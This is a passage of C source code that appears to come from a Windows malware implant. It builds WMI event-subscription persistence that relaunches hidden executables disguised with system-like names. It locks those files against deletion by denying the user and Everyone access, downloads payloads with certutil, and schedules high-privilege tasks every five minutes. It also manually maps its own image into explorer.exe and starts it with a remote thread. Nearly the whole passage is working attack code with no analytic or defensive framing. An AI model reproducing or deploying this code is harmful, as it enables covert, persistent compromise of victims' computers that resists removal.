    fprintf(f, "Consumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"$p=\"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\"; @(\"ElevationService\",\"CrashHandler\",\"NotifyService\") | %% { if (-not (gps -Name $_ -EA SilentlyContinue)) { Start-Process \"$p\\$_.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden } }\"'}; ");
    fprintf(f, "Set-WmiObject -C _");
    fprintf(f, "_FilterToConsumerBinding -N 'root/subscription' -A @{Filter=$fl;Consumer=$co}\n");
    fclose(f);
    
    char cmd[512];
    char *ps = util_ps();
    snprintf(cmd, sizeof(cmd), "%s -NoProfile -ExecutionPolicy RemoteSigned -File \"%s\"", ps, psPath);
    sys_run_command(cmd);
    
    DeleteFileA(psPath);
}

/* === Utility harden files ===
 * Prevents deletion by:
 * 1. Denying delete permissions via icacls
 * 2. Hiding files (hidden + system attributes)
 * 3. Removing inherited permissions
 */
/* === Aggressive file hardening: directory + files ===
 *
 * 1. Hardening the PARENT directory (deny DELETE_CHILD prevents file deletion)
 * 2. Changing owner to SYSTEM on both directory and files
 * 3. Setting SYSTEM + HIDDEN attributes
 * 4. Removing all inherited permissions
 * 5. Explicitly denying all write/delete/modify permissions for Everyone
 */

void util_lock_files(void) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char dirPath[MAX_PATH];
    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
    
    const char *files[] = {
        "ElevationService.exe",
        "CrashHandler.exe",
        "NotifyService.exe"
    };
    
    char *icacls = util_icacls();
    char cmd[1024];
    
    /* --- Harden directory first --- */
    SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    /* Remove inheritance, grant only RX, deny ALL modifications including DELETE_CHILD */
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
        icacls, dirPath);
    sys_run_command(cmd);
    
    /* Change directory owner to SYSTEM */
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
        icacls, dirPath);
    sys_run_command(cmd);
    
    /* --- Harden each file --- */
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\%s", dirPath, files[i]);
        
        /* Set hidden + system attributes */
        SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        /* Change owner to SYSTEM */
        snprintf(cmd, sizeof(cmd),
            "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
            icacls, path);
        sys_run_command(cmd);
        
        /* Remove inheritance, grant only RX, deny ALL modifications */
        snprintf(cmd, sizeof(cmd),
            "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
            icacls, path);
        sys_run_command(cmd);
        
        /* Also explicitly deny the current user (defense in depth) */
        char username[256];
        DWORD userLen = sizeof(username);
        if (GetUserNameA(username, &userLen)) {
            snprintf(cmd, sizeof(cmd),
                "%s \"%s\" /deny \"%s:(DE,DC,WDAC,WO,W,M)\" /c /q",
                icacls, path, username);
            sys_run_command(cmd);
        }
    }
}

/* Harden a single file (used immediately after copy in spawn_single_copy) */
void util_lock_file(const char *filename) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
             localAppData, filename);
    
    char *icacls = util_icacls();
    char cmd[1024];
    
    /* Set hidden + system attributes */
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    /* Change owner to SYSTEM */
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
        icacls, path);
    sys_run_command(cmd);
    
    /* Remove inheritance, grant only RX, deny ALL modifications */
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
        icacls, path);
    sys_run_command(cmd);
    
    /* Also explicitly deny the current user */
    char username[256];
    DWORD userLen = sizeof(username);
    if (GetUserNameA(username, &userLen)) {
        snprintf(cmd, sizeof(cmd),
            "%s \"%s\" /deny \"%s:(DE,DC,WDAC,WO,W,M)\" /c /q",
            icacls, path, username);
        sys_run_command(cmd);
    }
}

/* === Utility LOLBAS download === */
void util_download_file(const char *url, const char *outPath) {
    char cmd[1024];
    char *certutil = util_certutil();
    snprintf(cmd, sizeof(cmd), "%s -urlcache -split -f \"%s\" \"%s\"", certutil, url, outPath);
    sys_run_command(cmd);
}

/* === Utility scheduled task === */
void util_ensure_task(const char *exePath, const char *taskName) {
    char cmd[1024];
    char *schtasks = util_schtasks();
    snprintf(cmd, sizeof(cmd),
        "%s /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
        schtasks, taskName, exePath);
    sys_run_command(cmd);
}

 *
 * Maps the current EXE into a remote process (explorer.exe) entirely from memory.
 * Fixes both relocations AND imports correctly for the remote process's ASLR layout.
 *
 * ASLR Fix: Instead of using local GetProcAddress results directly in remote IAT,
 * we compute remote addresses as: remote_base + (local_func - local_base).
 * Since ASLR randomizes module bases but NOT offsets within a DLL, this is exact.
 */
void util_load_remote(void) {
    /* 1. Read current EXE into local buffer */
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    HANDLE hFile = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *imageData = (BYTE*)malloc(fileSize);
    if (!imageData) { CloseHandle(hFile); return; }

    DWORD read;
    ReadFile(hFile, imageData, fileSize, &read, NULL);
    CloseHandle(hFile);

    /* 2. Parse PE headers */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { free(imageData); return; }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { free(imageData); return; }

    /* 3. Find explorer.exe PID */
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (pid == 0) { free(imageData); return; }

    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { free(imageData); return; }

    /* 4. Unmap existing image at preferred base if occupied */
    pNtUnmapViewOfSection_t pNtUnmap = util_get_ntunmap();
    DWORD64 prefBase = nt->OptionalHeader.ImageBase;
    if (pNtUnmap) pNtUnmap(hProc, (PVOID)prefBase);

    util_delay();

    /* 5. Allocate memory in remote process */
    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    PVOID remoteImg = util_VirtualAllocEx(hProc, (PVOID)prefBase, imgSize,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteImg)
        remoteImg = util_VirtualAllocEx(hProc, NULL, imgSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteImg) {
        CloseHandle(hProc);
        free(imageData);
        return;
    }

    /* 6. Write headers and sections to remote process */
    util_WriteProcessMemory(hProc, remoteImg, imageData, nt->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PVOID)((DWORD64)remoteImg + sec[i].VirtualAddress);
        PVOID src  = (PVOID)(imageData + sec[i].PointerToRawData);
        util_WriteProcessMemory(hProc, dest, src, sec[i].SizeOfRawData, NULL);
    }

    util_delay();

    /* 7. Fix relocations */
    DWORD64 delta = (DWORD64)remoteImg - prefBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageData + relocDir.VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < numEntries; i++) {
                    WORD type   = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        PVOID addr = (PVOID)((DWORD64)remoteImg + reloc->VirtualAddress + offset);
                        DWORD64 value;
                        if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
                            value += delta;
                            util_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
                        }
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        PVOID addr = (PVOID)((DWORD64)remoteImg + reloc->VirtualAddress + offset);
                        DWORD32 value;
                        if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
                            value += (DWORD32)delta;
                            util_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
                        }
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* 8. Fix imports — ASLR-AWARE
     *
     * For each imported DLL:
     *   localBase  = LoadLibraryA(dllName) in OUR process
     *   remoteBase = enumerate modules in TARGET process
     *   For each function:
     *     localAddr  = GetProcAddress(localBase, funcName)
     *     offset     = localAddr - localBase
     *     remoteAddr = remoteBase + offset   <-- ASLR-safe
     */
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
    HMODULE hKernel32 = GetModuleHandleA(kernel32);

    char *enumProcStr = util_enumproc();
    char *getBaseNameStr = util_getbasename();
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProcStr);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseNameStr);

    IMAGE_DATA_DIRECTORY importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImg + importDir.VirtualAddress);

        while (importDesc->Name != 0) {
            char dllName[256];
            ReadProcessMemory(hProc, (LPCVOID)((DWORD64)remoteImg + importDesc->Name), dllName, sizeof(dllName), NULL);
            dllName[255] = '\0';

            HMODULE hLocalDll = LoadLibraryA(dllName);
            DWORD64 localBase = hLocalDll ? (DWORD64)hLocalDll : 0;
            DWORD64 remoteBase = 0;

            /* Try to find already-loaded module in remote process */
            if (pEnum && pGetBaseName && localBase) {
                HMODULE hMods[1024];
                DWORD cbNeeded;
                if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
                    for (unsigned int m = 0; m < (cbNeeded / sizeof(HMODULE)); m++) {
                        char szModName[MAX_PATH];
                        if (pGetBaseName(hProc, hMods[m], szModName, sizeof(szModName))) {
                            if (_stricmp(szModName, dllName) == 0) {
                                remoteBase = (DWORD64)hMods[m];
                                break;
                            }
                        }
                    }
                }
            }

            if (remoteBase == 0 && localBase) {
                FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
                if (pLoadLibraryA) {
                    SIZE_T dllNameLen = strlen(dllName) + 1;
                    LPVOID rDllName = util_VirtualAllocEx(hProc, NULL, dllNameLen,
                                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (rDllName) {
                        util_WriteProcessMemory(hProc, rDllName, dllName, dllNameLen, NULL);
                        HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0,
                            (LPTHREAD_START_ROUTINE)pLoadLibraryA, rDllName, 0, NULL);
                        if (hThread) {
                            WaitForSingleObject(hThread, 10000);
                            CloseHandle(hThread);
                        }
                        /* Re-enumerate to pick up the newly loaded module */
                        if (pEnum && pGetBaseName) {
                            HMODULE hMods[1024];
                            DWORD cbNeeded;
                            if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
                                for (unsigned int m = 0; m < (cbNeeded / sizeof(HMODULE)); m++) {
                                    char szModName[MAX_PATH];
                                    if (pGetBaseName(hProc, hMods[m], szModName, sizeof(szModName))) {
                                        if (_stricmp(szModName, dllName) == 0) {
                                            remoteBase = (DWORD64)hMods[m];
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            /* Resolve imports using remote_base + offset */
            if (remoteBase && localBase) {
                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;

                int idx = 0;
                while (1) {
                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImg + importDesc->FirstThunk +
                                                idx * sizeof(IMAGE_THUNK_DATA));
                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImg + origThunkRVA +
                                                   idx * sizeof(IMAGE_THUNK_DATA));
                    ReadProcessMemory(hProc, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
                    ReadProcessMemory(hProc, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
                    if (thunkVal.u1.AddressOfData == 0) break;

                    FARPROC localAddr = NULL;
                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        localAddr = GetProcAddress(hLocalDll,
                            (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
                    } else {
                        char funcName[256];
                        PVOID nameAddr = (PVOID)((DWORD64)remoteImg +
                                                   origThunkVal.u1.AddressOfData + 2);
                        ReadProcessMemory(hProc, nameAddr, funcName, sizeof(funcName), NULL);
                        funcName[255] = '\0';
                        localAddr = GetProcAddress(hLocalDll, funcName);
                    }

                    if (localAddr) {
                        DWORD64 offset = (DWORD64)localAddr - localBase;
                        DWORD64 remoteAddr = remoteBase + offset;
                        util_WriteProcessMemory(hProc, thunkAddr, &remoteAddr, sizeof(remoteAddr), NULL);
                    }
                    idx++;
                }
            }
            importDesc++;
        }
    }

    util_delay();

    /* 9. Update remote PEB ImageBaseAddress */
    pNtQueryInfoProc_t pNtQuery = util_get_ntqueryinfo();
    if (pNtQuery) {
        PROCESS_BASIC_INFORMATION pbi;
        ULONG retLen;
        if (pNtQuery(hProc, 0 /* ProcessBasicInformation */, &pbi, sizeof(pbi), &retLen) == 0) {
            PVOID pebImageBase = (PVOID)((DWORD64)pbi.PebBaseAddress + 0x10);
            util_WriteProcessMemory(hProc, pebImageBase, &remoteImg, sizeof(remoteImg), NULL);
        }
    }
    
    /* 9.5 Change protection from RW to RX after all writes are done */
    DWORD oldProtect;
    VirtualProtectEx(hProc, remoteImg, imgSize, PAGE_EXECUTE_READ, &oldProtect);

    /* 10. Create remote thread at entry point */
    DWORD64 entryPoint = (DWORD64)remoteImg + nt->OptionalHeader.AddressOfEntryPoint;
    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);

    CloseHandle(hProc);
    free(imageData);
}
